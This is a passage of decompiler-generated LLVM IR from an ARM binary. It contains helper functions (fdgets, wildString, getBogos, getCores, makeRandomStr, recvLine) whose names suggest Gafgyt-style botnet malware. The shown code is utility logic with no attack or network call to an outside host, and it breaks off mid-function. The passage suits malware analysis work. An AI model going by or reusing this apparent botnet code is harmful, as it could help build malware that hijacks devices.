  %v2_90e4 = icmp eq i32 %v2_90e0, 0
  br i1 %v2_90e4, label %dec_label_pc_9214, label %dec_label_pc_90f8

dec_label_pc_90f8:                                ; preds = %dec_label_pc_90c8
  %v1_90fc = call i32 @__libc_close(i32 %arg1)
  %v2_9100 = ptrtoint i32* %stack_var_-276 to i32
  store i32 %v2_9100, i32* @r0, align 4
  %v1_9108 = call i32 @sigemptyset(i32 %v2_9100)
  store i32 %v2_9100, i32* @r0, align 4
  %v2_9118 = call i32 @__GI_sigaddset(i32 %v2_9100, i32 2)
  store i32 %v2_9100, i32* @r0, align 4
  %v2_9128 = call i32 @__GI_sigaddset(i32 %v2_9100, i32 3)
  store i32 %v2_9100, i32* @r0, align 4
  %v2_9138 = call i32 @__GI_sigaddset(i32 %v2_9100, i32 1)
  %v2_9140 = ptrtoint i32* %stack_var_-148 to i32
  %v3_914c = bitcast i32* %stack_var_-276 to %_TYPEDEF_sigset_t*
  %v4_914c = call i32 @__GI_sigprocmask(i32 0, %_TYPEDEF_sigset_t* %v3_914c, i32 %v2_9140)
  %v2_916c = ptrtoint i32* %stack_var_-280 to i32
  br label %dec_label_pc_9150

dec_label_pc_9150:                                ; preds = %dec_label_pc_9194, %dec_label_pc_90f8
  %v2_9160 = load i32, i32* @global_var_2a880.37, align 4
  %v2_9164 = add i32 %v2_9160, %v3_90cc
  %v1_9168 = inttoptr i32 %v2_9164 to i32*
  %v2_9168 = load i32, i32* %v1_9168, align 4
  %v3_917c = call i32 @__libc_waitpid(i32 %v2_9168, i32 %v2_916c, i32 0)
  %v3_918c = icmp eq i32 %v3_917c, -1
  %v8_918c = icmp eq i32 %v3_917c, -1
  br i1 %v3_918c, label %dec_label_pc_9194, label %dec_label_pc_91a8

dec_label_pc_9194:                                ; preds = %dec_label_pc_9150
  %v0_9194 = call i32 @__errno_location()
  %v1_919c = inttoptr i32 %v0_9194 to i32*
  %v2_919c = load i32, i32* %v1_919c, align 4
  %v7_91a0 = icmp eq i32 %v2_919c, 4
  br i1 %v7_91a0, label %dec_label_pc_9150, label %dec_label_pc_91a8

dec_label_pc_91a8:                                ; preds = %dec_label_pc_9150, %dec_label_pc_9194
  %v3_91b8 = bitcast i32* %stack_var_-148 to %_TYPEDEF_sigset_t*
  %v4_91b8 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_91b8, i32 0)
  %v3_91c0 = mul i32 %tmp6, 4
  %v2_91cc = load i32, i32* @global_var_2a880.37, align 4
  %v2_91d0 = add i32 %v2_91cc, %v3_91c0
  %v2_91d8 = inttoptr i32 %v2_91d0 to i32*
  store i32 0, i32* %v2_91d8, align 4
  br i1 %v8_918c, label %dec_label_pc_9214, label %dec_label_pc_91e8

dec_label_pc_91e8:                                ; preds = %dec_label_pc_91a8
  %v3_91e8 = load i32, i32* %stack_var_-280, align 4
  %v1_91f4 = and i32 %v3_91e8, 65280
  %v3_91f81 = udiv i32 %v1_91f4, 256
  br label %dec_label_pc_9214

dec_label_pc_9214:                                ; preds = %dec_label_pc_91e8, %dec_label_pc_91a8, %entry, %dec_label_pc_90c8
  %storemerge4 = phi i32 [ -1, %dec_label_pc_90c8 ], [ -1, %entry ], [ %v3_91f81, %dec_label_pc_91e8 ], [ -1, %dec_label_pc_91a8 ]
  ret i32 %storemerge4

; uselistorder directives
  uselistorder i32 %v2_9100, { 1, 0, 3, 2, 5, 4, 7, 6 }
  uselistorder i32 %v3_90cc, { 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_sigaddset, { 2, 1, 0 }
  uselistorder i32* @global_var_2a880.37, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_9214, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_91a8, { 1, 0 }
}

define i32 @fdgets(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  br label %dec_label_pc_9298

dec_label_pc_9258:                                ; preds = %dec_label_pc_92a8
  store i32 %v2_92b4, i32* @r1, align 4
  store i32 1, i32* @r2, align 4
  %v1_9274 = call i32 @__libc_read(i32 %arg3)
  %v1_9284 = add nuw i32 %storemerge25, 1
  %v7_9290 = icmp eq i32 %v1_9274, 1
  br i1 %v7_9290, label %dec_label_pc_9298, label %dec_label_pc_92c8

dec_label_pc_9298:                                ; preds = %entry, %dec_label_pc_9258
  %storemerge25 = phi i32 [ 0, %entry ], [ %v1_9284, %dec_label_pc_9258 ]
  %v6_92a4 = icmp slt i32 %storemerge25, %arg2
  br i1 %v6_92a4, label %dec_label_pc_92a8, label %dec_label_pc_92c8

dec_label_pc_92a8:                                ; preds = %dec_label_pc_9298
  %v2_92b4 = add i32 %storemerge25, %arg1
  %v1_92b8 = add i32 %v2_92b4, -1
  %v1_92bc = inttoptr i32 %v1_92b8 to i8*
  %v2_92bc = load i8, i8* %v1_92bc, align 1
  %v7_92c0 = icmp eq i8 %v2_92bc, 10
  br i1 %v7_92c0, label %dec_label_pc_92c8, label %dec_label_pc_9258

dec_label_pc_92c8:                                ; preds = %dec_label_pc_92a8, %dec_label_pc_9298, %dec_label_pc_9258
  %stack_var_-24.0.lcssa = phi i32 [ 1, %dec_label_pc_92a8 ], [ 1, %dec_label_pc_9298 ], [ %v1_9274, %dec_label_pc_9258 ]
  %v2_92cc = icmp eq i32 %stack_var_-24.0.lcssa, 0
  %storemerge3 = select i1 %v2_92cc, i32 0, i32 %arg1
  ret i32 %storemerge3

; uselistorder directives
  uselistorder i32 %v2_92b4, { 1, 0 }
  uselistorder i32 %v1_9274, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_9298, { 1, 0 }
}

define i32 @parseHex(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_934c4 = load i8, i8* %arg1, align 1
  %v2_93506 = icmp eq i8 %v2_934c4, 0
  br i1 %v2_93506, label %dec_label_pc_9364, label %dec_label_pc_9358

dec_label_pc_9318:                                ; preds = %dec_label_pc_9358
  %v3_931c = mul i32 %stack_var_-20.07, 16
  %v4_9320 = ptrtoint i8* %v3_933c to i32
  %v2_9324 = load i8, i8* %v3_933c, align 1
  %v3_9324 = zext i8 %v2_9324 to i32
  %v4_9330 = mul nuw nsw i32 %v3_9324, 4
  %v5_9330 = add i32 %v4_9330, ptrtoint (i32* @global_var_1b2fc.46 to i32)
  %v6_9330 = inttoptr i32 %v5_9330 to i32*
  %v7_9330 = load i32, i32* %v6_9330, align 4
  %v2_9334 = or i32 %v7_9330, %v3_931c
  %v1_9340 = add i32 %v4_9320, 1
  %v5_9344 = inttoptr i32 %v1_9340 to i8*
  %v2_934c = load i8, i8* %v5_9344, align 1
  %v2_9350 = icmp eq i8 %v2_934c, 0
  br i1 %v2_9350, label %dec_label_pc_9364, label %dec_label_pc_9358

dec_label_pc_9358:                                ; preds = %entry, %dec_label_pc_9318
  %v3_933c = phi i8* [ %v5_9344, %dec_label_pc_9318 ], [ %arg1, %entry ]
  %stack_var_-20.07 = phi i32 [ %v2_9334, %dec_label_pc_9318 ], [ 0, %entry ]
  %v1_935c = icmp slt i32 %stack_var_-20.07, 0
  br i1 %v1_935c, label %dec_label_pc_9364, label %dec_label_pc_9318

dec_label_pc_9364:                                ; preds = %dec_label_pc_9318, %dec_label_pc_9358, %entry
  %stack_var_-20.0.lcssa = phi i32 [ 0, %entry ], [ %v2_9334, %dec_label_pc_9318 ], [ %stack_var_-20.07, %dec_label_pc_9358 ]
  ret i32 %stack_var_-20.0.lcssa

; uselistorder directives
  uselistorder i32 %stack_var_-20.07, { 1, 2, 0 }
  uselistorder label %dec_label_pc_9364, { 1, 0, 2 }
  uselistorder label %dec_label_pc_9358, { 1, 0 }
}

define i32 @wildString(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp8 = ptrtoint i8* %arg1 to i32
  %stack_var_-4 = alloca i32, align 4
  %v3_937c = load i32, i32* @r4, align 4
  %v6_937c = load i32, i32* @fp, align 4
  store i32 37764, i32* %stack_var_-4, align 4
  %v2_9380 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9380, i32* @fp, align 4
  %v2_9394 = load i8, i8* %arg1, align 1
  %v7_93a0 = icmp eq i8 %v2_9394, 42
  br i1 %v7_93a0, label %dec_label_pc_93d4, label %dec_label_pc_93a8

dec_label_pc_93a8:                                ; preds = %entry
  %v7_93ac = icmp eq i8 %v2_9394, 63
  br i1 %v7_93ac, label %dec_label_pc_9444, label %dec_label_pc_93b4

dec_label_pc_93b4:                                ; preds = %dec_label_pc_93a8
  %v2_93b8 = icmp eq i8 %v2_9394, 0
  br i1 %v2_93b8, label %dec_label_pc_93c4, label %dec_label_pc_949c

dec_label_pc_93c4:                                ; preds = %dec_label_pc_93b4
  %v2_93c8 = load i8, i8* %tmp, align 1
  %v3_93c8 = zext i8 %v2_93c8 to i32
  br label %dec_label_pc_9510

dec_label_pc_93d4:                                ; preds = %entry
  %v1_93d8 = add i32 %tmp8, 1
  %v3_93e4 = inttoptr i32 %v1_93d8 to i8*
  %v4_93e4 = call i32 @wildString(i8* %v3_93e4, i32 %arg2)
  %v2_93ec = icmp eq i32 %v4_93e4, 0
  br i1 %v2_93ec, label %dec_label_pc_9430, label %dec_label_pc_93f4

dec_label_pc_93f4:                                ; preds = %dec_label_pc_93d4
  %v2_93f8 = load i8, i8* %tmp, align 1
  %v2_93fc = icmp eq i8 %v2_93f8, 0
  br i1 %v2_93fc, label %dec_label_pc_9438, label %dec_label_pc_9404

dec_label_pc_9404:                                ; preds = %dec_label_pc_93f4
  %v1_9408 = add i32 %arg2, 1
  %v4_9414 = call i32 @wildString(i8* nonnull %arg1, i32 %v1_9408)
  %v2_941c = icmp eq i32 %v4_9414, 0
  br i1 %v2_941c, label %dec_label_pc_9430, label %dec_label_pc_9438

dec_label_pc_9430:                                ; preds = %dec_label_pc_9404, %dec_label_pc_93d4
  br label %dec_label_pc_9438

dec_label_pc_9438:                                ; preds = %dec_label_pc_93f4, %dec_label_pc_9404, %dec_label_pc_9430
  %storemerge3 = phi i32 [ 0, %dec_label_pc_9430 ], [ 1, %dec_label_pc_9404 ], [ 1, %dec_label_pc_93f4 ]
  br label %dec_label_pc_9510

dec_label_pc_9444:                                ; preds = %dec_label_pc_93a8
  %v2_9448 = load i8, i8* %tmp, align 1
  %v2_944c = icmp eq i8 %v2_9448, 0
  br i1 %v2_944c, label %dec_label_pc_9490, label %dec_label_pc_9454

dec_label_pc_9454:                                ; preds = %dec_label_pc_9444
  %v1_9458 = add i32 %tmp8, 1
  %v1_9460 = add i32 %arg2, 1
  %v2_946c = inttoptr i32 %v1_9458 to i8*
  %v3_946c = call i32 @wildString(i8* %v2_946c, i32 %v1_9460)
  %v2_9474 = icmp ne i32 %v3_946c, 0
  %. = zext i1 %v2_9474 to i32
  br label %dec_label_pc_9490

dec_label_pc_9490:                                ; preds = %dec_label_pc_9454, %dec_label_pc_9444
  %storemerge2 = phi i32 [ 1, %dec_label_pc_9444 ], [ %., %dec_label_pc_9454 ]
  br label %dec_label_pc_9510

dec_label_pc_949c:                                ; preds = %dec_label_pc_93b4
  %v2_94a0 = load i8, i8* %arg1, align 1
  %v3_94a0 = zext i8 %v2_94a0 to i32
  %v1_94a8 = call i32 @__GI_toupper(i32 %v3_94a0)
  store i32 %v1_94a8, i32* @r4, align 4
  %v2_94b4 = load i8, i8* %tmp, align 1
  %v3_94b4 = zext i8 %v2_94b4 to i32
  %v1_94bc = call i32 @__GI_toupper(i32 %v3_94b4)
  %v0_94c4 = load i32, i32* @r4, align 4
  %v9_94c4 = icmp eq i32 %v0_94c4, %v1_94bc
  br i1 %v9_94c4, label %dec_label_pc_94cc, label %dec_label_pc_9508

dec_label_pc_94cc:                                ; preds = %dec_label_pc_949c
  %v1_94d0 = add i32 %tmp8, 1
  %v1_94d8 = add i32 %arg2, 1
  %v2_94e4 = inttoptr i32 %v1_94d0 to i8*
  %v3_94e4 = call i32 @wildString(i8* %v2_94e4, i32 %v1_94d8)
  %v2_94ec = icmp ne i32 %v3_94e4, 0
  %.7 = zext i1 %v2_94ec to i32
  br label %dec_label_pc_9508

dec_label_pc_9508:                                ; preds = %dec_label_pc_94cc, %dec_label_pc_949c
  %storemerge = phi i32 [ 1, %dec_label_pc_949c ], [ %.7, %dec_label_pc_94cc ]
  br label %dec_label_pc_9510

dec_label_pc_9510:                                ; preds = %dec_label_pc_9490, %dec_label_pc_9438, %dec_label_pc_93c4, %dec_label_pc_9508
  %stack_var_-44.0 = phi i32 [ %storemerge3, %dec_label_pc_9438 ], [ %storemerge2, %dec_label_pc_9490 ], [ %v3_93c8, %dec_label_pc_93c4 ], [ %storemerge, %dec_label_pc_9508 ]
  store i32 %v3_937c, i32* @r4, align 4
  store i32 %v6_937c, i32* @fp, align 4
  ret i32 %stack_var_-44.0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8* %tmp, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 3, 2, 0, 1, 4 }
  uselistorder label %dec_label_pc_9510, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_9438, { 2, 1, 0 }
}

define i32 @getHost(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_9540 = call i32 @inet_addr(i32 %arg1)
  store i32 %v1_9540, i32* %arg2, align 4
  %v3_9558 = icmp eq i32 %v1_9540, -1
  %. = zext i1 %v3_9558 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @uppercase(i8* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i8*, align 4
  %v0_9594 = load i32, i32* %r0.global-to-local, align 4
  %storemerge2 = inttoptr i32 %v0_9594 to i8*
  store i8* %storemerge2, i8** %stack_var_-20, align 4
  %v2_95cc3 = load i8, i8* %storemerge2, align 1
  %v2_95d05 = icmp eq i8 %v2_95cc3, 0
  br i1 %v2_95d05, label %dec_label_pc_95d8, label %dec_label_pc_959c

dec_label_pc_959c:                                ; preds = %entry, %dec_label_pc_959c
  %v2_95d88 = phi i8* [ %storemerge, %dec_label_pc_959c ], [ %storemerge2, %entry ]
  %v2_95a0 = load i8, i8* %v2_95d88, align 1
  %v3_95a0 = zext i8 %v2_95a0 to i32
  store i32 %v3_95a0, i32* %r0.global-to-local, align 4
  %v1_95a8 = call i32 @__GI_toupper(i32 %v3_95a0)
  store i32 %v1_95a8, i32* %r0.global-to-local, align 4
  %v3_95b4 = load i8*, i8** %stack_var_-20, align 4
  %v1_95b8 = trunc i32 %v1_95a8 to i8
  store i8 %v1_95b8, i8* %v3_95b4, align 1
  %v4_95bc = ptrtoint i8* %v3_95b4 to i32
  %v1_95c0 = add i32 %v4_95bc, 1
  %storemerge = inttoptr i32 %v1_95c0 to i8*
  store i8* %storemerge, i8** %stack_var_-20, align 4
  %v2_95cc = load i8, i8* %storemerge, align 1
  %v2_95d0 = icmp eq i8 %v2_95cc, 0
  br i1 %v2_95d0, label %dec_label_pc_95c8.dec_label_pc_95d8_crit_edge, label %dec_label_pc_959c

dec_label_pc_95c8.dec_label_pc_95d8_crit_edge:    ; preds = %dec_label_pc_959c
  %v13_95d8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_95d8

dec_label_pc_95d8:                                ; preds = %dec_label_pc_95c8.dec_label_pc_95d8_crit_edge, %entry
  %v13_95d8 = phi i32 [ %v13_95d8.pre, %dec_label_pc_95c8.dec_label_pc_95d8_crit_edge ], [ %v0_9594, %entry ]
  ret i32 %v13_95d8

; uselistorder directives
  uselistorder i8* %storemerge, { 1, 2, 0 }
  uselistorder i8** %stack_var_-20, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 2, 0, 1 }
  uselistorder label %dec_label_pc_959c, { 1, 0 }
}

define i32 @getBogos(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-4120 = alloca i32, align 4
  %stack_var_-4112 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_95e0 = load i32, i32* @fp, align 4
  store i32 %v3_95e0, i32* %stack_var_-16, align 4
  %v13_95e0 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v13_95e0, i32* @r2, align 4
  %v4_9608 = call i32 @__libc_open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1b6fc.48, i32 0, i32 0), i32 0)
  %v2_97cc = ptrtoint i32* %stack_var_-4120 to i32
  %v1_9628 = bitcast i32* %stack_var_-4120 to i8*
  br label %dec_label_pc_97c4

dec_label_pc_9618:                                ; preds = %dec_label_pc_97c4
  %v2_9628 = call i32 @uppercase(i8* %v1_9628)
  %v4_9640 = call i32 @strstr(i32 %v2_97cc, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1b70c.50, i32 0, i32 0))
  %v9_9658 = icmp eq i32 %v4_9640, %v2_97cc
  br i1 %v9_9658, label %dec_label_pc_9660, label %dec_label_pc_97a8

dec_label_pc_9660:                                ; preds = %dec_label_pc_9618
  %tmp18 = bitcast i32* %stack_var_-4112 to i8*
  br label %dec_label_pc_9684

dec_label_pc_9678:                                ; preds = %dec_label_pc_96a4, %dec_label_pc_9694, %dec_label_pc_9684
  %v1_967c = add i32 %v4_9684, 1
  %v5_9680 = inttoptr i32 %v1_967c to i8*
  br label %dec_label_pc_9684

dec_label_pc_9684:                                ; preds = %dec_label_pc_9660, %dec_label_pc_9678
  %storemerge2 = phi i8* [ %v5_9680, %dec_label_pc_9678 ], [ %tmp18, %dec_label_pc_9660 ]
  %v4_9684 = ptrtoint i8* %storemerge2 to i32
  %v2_9688 = load i8, i8* %storemerge2, align 1
  %v7_968c = icmp eq i8 %v2_9688, 32
  br i1 %v7_968c, label %dec_label_pc_9678, label %dec_label_pc_9694

dec_label_pc_9694:                                ; preds = %dec_label_pc_9684
  %v2_9698 = load i8, i8* %storemerge2, align 1
  %v7_969c = icmp eq i8 %v2_9698, 9
  br i1 %v7_969c, label %dec_label_pc_9678, label %dec_label_pc_96a4

dec_label_pc_96a4:                                ; preds = %dec_label_pc_9694
  %v2_96a8 = load i8, i8* %storemerge2, align 1
  %v7_96ac = icmp eq i8 %v2_96a8, 58
  br i1 %v7_96ac, label %dec_label_pc_9678, label %dec_label_pc_96e0.preheader

dec_label_pc_96e0.preheader:                      ; preds = %dec_label_pc_96a4
  %v2_96f8 = add i32 %v4_9684, -1
  br label %dec_label_pc_96e0

dec_label_pc_96b8:                                ; preds = %dec_label_pc_96e0, %dec_label_pc_970c
  %v3_96c0 = call i32 @strlen(i8* %storemerge2)
  %v1_96d4 = add i32 %v2_96f8, %v3_96c0
  %v3_96dc = inttoptr i32 %v1_96d4 to i8*
  store i8 0, i8* %v3_96dc, align 1
  br label %dec_label_pc_96e0

dec_label_pc_96e0:                                ; preds = %dec_label_pc_96e0.preheader, %dec_label_pc_96b8
  %v3_96e8 = call i32 @strlen(i8* %storemerge2)
  %v1_96fc = add i32 %v3_96e8, %v2_96f8
  %v1_9700 = inttoptr i32 %v1_96fc to i8*
  %v2_9700 = load i8, i8* %v1_9700, align 1
  %v7_9704 = icmp eq i8 %v2_9700, 13
  br i1 %v7_9704, label %dec_label_pc_96b8, label %dec_label_pc_970c

dec_label_pc_970c:                                ; preds = %dec_label_pc_96e0
  %v3_9714 = call i32 @strlen(i8* %storemerge2)
  %v1_9728 = add i32 %v3_9714, %v2_96f8
  %v1_972c = inttoptr i32 %v1_9728 to i8*
  %v2_972c = load i8, i8* %v1_972c, align 1
  %v7_9730 = icmp eq i8 %v2_972c, 10
  br i1 %v7_9730, label %dec_label_pc_96b8, label %dec_label_pc_9738

dec_label_pc_9738:                                ; preds = %dec_label_pc_970c
  %v2_9744 = call i32 @__GI_strchr(i32 %v4_9684, i32 46)
  %v2_974c = icmp eq i32 %v2_9744, 0
  br i1 %v2_974c, label %dec_label_pc_9770, label %dec_label_pc_9754

dec_label_pc_9754:                                ; preds = %dec_label_pc_9738
  %v2_9760 = call i32 @__GI_strchr(i32 %v4_9684, i32 46)
  %v3_976c = inttoptr i32 %v2_9760 to i8*
  store i8 0, i8* %v3_976c, align 1
  br label %dec_label_pc_9770

dec_label_pc_9770:                                ; preds = %dec_label_pc_9738, %dec_label_pc_9754
  %v3_978c = call i32 @strcpy(i32 %arg1, i8* %storemerge2)
  %v1_9794 = call i32 @__libc_close(i32 %v4_9608)
  br label %dec_label_pc_9800

dec_label_pc_97a8:                                ; preds = %dec_label_pc_9618
  store i32 4096, i32* @r2, align 4
  %v3_97c0 = call i32 @__GI_memset(i8* %v1_9628, i32 0)
  br label %dec_label_pc_97c4

dec_label_pc_97c4:                                ; preds = %entry, %dec_label_pc_97a8
  %v4_97dc = call i32 @fdgets(i32 %v2_97cc, i32 4096, i32 %v4_9608, i32 %v2_97cc)
  %v2_97e4 = icmp eq i32 %v4_97dc, 0
  br i1 %v2_97e4, label %dec_label_pc_97ec, label %dec_label_pc_9618

dec_label_pc_97ec:                                ; preds = %dec_label_pc_97c4
  %v1_97f0 = call i32 @__libc_close(i32 %v4_9608)
  br label %dec_label_pc_9800

dec_label_pc_9800:                                ; preds = %dec_label_pc_9770, %dec_label_pc_97ec
  %storemerge4 = phi i32 [ 1, %dec_label_pc_97ec ], [ 0, %dec_label_pc_9770 ]
  ret i32 %storemerge4

; uselistorder directives
  uselistorder i32 %v2_96f8, { 1, 2, 0 }
  uselistorder i8* %storemerge2, { 0, 1, 3, 2, 4, 5, 7, 6 }
  uselistorder i32 %v2_97cc, { 0, 3, 1, 2 }
  uselistorder i32 %v4_9608, { 1, 2, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder label %dec_label_pc_9800, { 1, 0 }
  uselistorder label %dec_label_pc_97c4, { 1, 0 }
  uselistorder label %dec_label_pc_9770, { 1, 0 }
  uselistorder label %dec_label_pc_96e0, { 1, 0 }
  uselistorder label %dec_label_pc_96b8, { 1, 0 }
  uselistorder label %dec_label_pc_9684, { 1, 0 }
}

define i32 @getCores(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4120 = alloca i32, align 4
  %v2_982c = ptrtoint i32* %stack_var_-4120 to i32
  %v4_9840 = call i32 @__libc_open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1b6fc.48, i32 0, i32 0), i32 0)
  %v1_9860 = bitcast i32* %stack_var_-4120 to i8*
  br label %dec_label_pc_98bc

dec_label_pc_9850:                                ; preds = %dec_label_pc_98bc
  %v2_9860 = call i32 @uppercase(i8* %v1_9860)
  %v4_9878 = call i32 @strstr(i32 %v2_982c, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1b70c.50, i32 0, i32 0))
  %v9_988c = icmp eq i32 %v4_9878, %v2_982c
  br i1 %v9_988c, label %dec_label_pc_9894, label %dec_label_pc_98a0

dec_label_pc_9894:                                ; preds = %dec_label_pc_9850
  %v1_9898 = add i32 %stack_var_-24.1, 1
  br label %dec_label_pc_98a0

dec_label_pc_98a0:                                ; preds = %dec_label_pc_9850, %dec_label_pc_9894
  %stack_var_-24.0 = phi i32 [ %v1_9898, %dec_label_pc_9894 ], [ %stack_var_-24.1, %dec_label_pc_9850 ]
  store i32 4096, i32* @r2, align 4
  %v3_98b8 = call i32 @__GI_memset(i8* %v1_9860, i32 0)
  br label %dec_label_pc_98bc

dec_label_pc_98bc:                                ; preds = %entry, %dec_label_pc_98a0
  %stack_var_-24.1 = phi i32 [ 0, %entry ], [ %stack_var_-24.0, %dec_label_pc_98a0 ]
  %v4_98d4 = call i32 @fdgets(i32 %v2_982c, i32 4096, i32 %v4_9840, i32 %v2_982c)
  %v2_98dc = icmp eq i32 %v4_98d4, 0
  br i1 %v2_98dc, label %dec_label_pc_98e4, label %dec_label_pc_9850

dec_label_pc_98e4:                                ; preds = %dec_label_pc_98bc
  %v1_98e8 = call i32 @__libc_close(i32 %v4_9840)
  ret i32 %stack_var_-24.1

; uselistorder directives
  uselistorder i32 %stack_var_-24.1, { 0, 2, 1 }
  uselistorder i32 %v2_982c, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_98bc, { 1, 0 }
  uselistorder label %dec_label_pc_98a0, { 1, 0 }
}

define i32 @makeRandomStr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_9908 = load i32, i32* @r4, align 4
  %v6_9908 = load i32, i32* @fp, align 4
  %v0_9914 = load i32, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-32, align 4
  %v5_998017 = icmp sgt i32 %arg2, 0
  br i1 %v5_998017, label %dec_label_pc_9930, label %dec_label_pc_9984

dec_label_pc_9930:                                ; preds = %entry, %dec_label_pc_9930
  %storemerge118 = phi i32 [ %v1_996c, %dec_label_pc_9930 ], [ 0, %entry ]
  %v2_993c = add i32 %storemerge118, %v0_9914
  store i32 %v2_993c, i32* @r4, align 4
  %v0_9940 = call i32 @rand_cmwc()
  %v2_9950 = urem i32 %v0_9940, 26
  store i32 %v2_9950, i32* %r0.global-to-local, align 4
  %v1_995c = add nuw nsw i32 %v2_9950, 65
  %v1_9964 = trunc i32 %v1_995c to i8
  %v2_9964 = load i32, i32* @r4, align 4
  %v3_9964 = inttoptr i32 %v2_9964 to i8*
  store i8 %v1_9964, i8* %v3_9964, align 1
  %v1_996c = add i32 %storemerge118, 1
  %v3_9978.pre = load i32, i32* %stack_var_-32, align 4
  %v5_9980 = icmp slt i32 %v1_996c, %v3_9978.pre
  br i1 %v5_9980, label %dec_label_pc_9930, label %dec_label_pc_9974.dec_label_pc_9984_crit_edge

dec_label_pc_9974.dec_label_pc_9984_crit_edge:    ; preds = %dec_label_pc_9930
  %v12_9988.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9984

dec_label_pc_9984:                                ; preds = %dec_label_pc_9974.dec_label_pc_9984_crit_edge, %entry
  %v12_9988 = phi i32 [ %v12_9988.pre, %dec_label_pc_9974.dec_label_pc_9984_crit_edge ], [ %v0_9914, %entry ]
  store i32 %v3_9908, i32* @r4, align 4
  store i32 %v6_9908, i32* @fp, align 4
  ret i32 %v12_9988

; uselistorder directives
  uselistorder i32 %v1_996c, { 1, 0 }
  uselistorder label %dec_label_pc_9930, { 1, 0 }
}

define i32 @recvLine(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_99e0.lr.ph:
  %tmp33 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-185 = alloca i8, align 1
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_9990 = load i32, i32* @fp, align 4
  store i32 %v3_9990, i32* %stack_var_-16, align 4
  store i32 39320, i32* %stack_var_-4, align 4
  %v2_9994 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9994, i32* @fp, align 4
  store i32 %arg3, i32* @r2, align 4
  %v4_99b8 = call i32 @__GI_memset(i8* %arg2, i32 0)
  store i32 30, i32* %stack_var_-184, align 4
  %v2_99cc = ptrtoint i32* %stack_var_-176 to i32
  br label %dec_label_pc_99e0

dec_label_pc_99e0:                                ; preds = %dec_label_pc_99e0.lr.ph, %dec_label_pc_99e0
  %storemerge527 = phi i32 [ 0, %dec_label_pc_99e0.lr.ph ], [ %v1_99f4, %dec_label_pc_99e0 ]
  %v5_99ec = mul nuw nsw i32 %storemerge527, 4
  %v6_99ec = add i32 %v5_99ec, %v2_99cc
  %v7_99ec = inttoptr i32 %v6_99ec to i32*
  store i32 0, i32* %v7_99ec, align 4
  %v1_99f4 = add nuw nsw i32 %storemerge527, 1
  %tmp52 = icmp ult i32 %v1_99f4, 32
  br i1 %tmp52, label %dec_label_pc_99e0, label %dec_label_pc_9a08

dec_label_pc_9a08:                                ; preds = %dec_label_pc_99e0
  %v13_9990 = ptrtoint i32* %stack_var_-16 to i32
  %v3_9a0c = udiv i32 %arg1, 32
  %v3_9a18 = mul nuw nsw i32 %v3_9a0c, 4
  %v2_9a20 = add nsw i32 %v3_9a18, -160
  %v2_9a24 = add i32 %v2_9a20, %v13_9990
  %v1_9a28 = inttoptr i32 %v2_9a24 to i32*
  %v2_9a28 = load i32, i32* %v1_9a28, align 4
  %v1_9a30 = urem i32 %arg1, 32
  %v6_9a38 = shl i32 1, %v1_9a30
  %v2_9a3c = or i32 %v2_9a28, %v6_9a38
  store i32 %v2_9a3c, i32* %v1_9a28, align 4
  %v1_9a5c = add i32 %arg1, 1
  %v2_9a68 = ptrtoint i32* %stack_var_-184 to i32
  store i32 0, i32* @r2, align 4
  %v5_9a7c = call i32 @__libc_select(i32 %v1_9a5c, i32 %v2_99cc, i32 0, i32 %v2_99cc, i32 %v2_9a68)
  %v5_9a90 = icmp sgt i32 %v5_9a7c, 0
  br i1 %v5_9a90, label %dec_label_pc_9c24.preheader, label %dec_label_pc_9b90.preheader

dec_label_pc_9b90.preheader:                      ; preds = %dec_label_pc_9a08
  %v7_9b9823 = icmp slt i32 %tmp33, 10
  br i1 %v7_9b9823, label %dec_label_pc_9ad0.lr.ph, label %dec_label_pc_9c24.preheader

dec_label_pc_9ad0.lr.ph:                          ; preds = %dec_label_pc_9b90.preheader, %dec_label_pc_9b84
